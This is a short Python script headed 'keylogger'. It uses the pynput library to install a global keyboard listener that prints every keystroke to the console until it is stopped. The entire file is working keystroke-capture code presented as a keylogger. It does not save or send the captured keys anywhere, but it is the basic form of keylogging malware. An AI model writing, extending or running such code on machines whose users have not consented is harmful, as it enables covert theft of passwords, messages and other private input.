# keylogger

import pynput.keyboard

def process_key_press(key):
    print(key)

KeyboardListener = pynput.keyboard.Listener(on_press=process_key_press)

with KeyboardListener:
    KeyboardListener.join()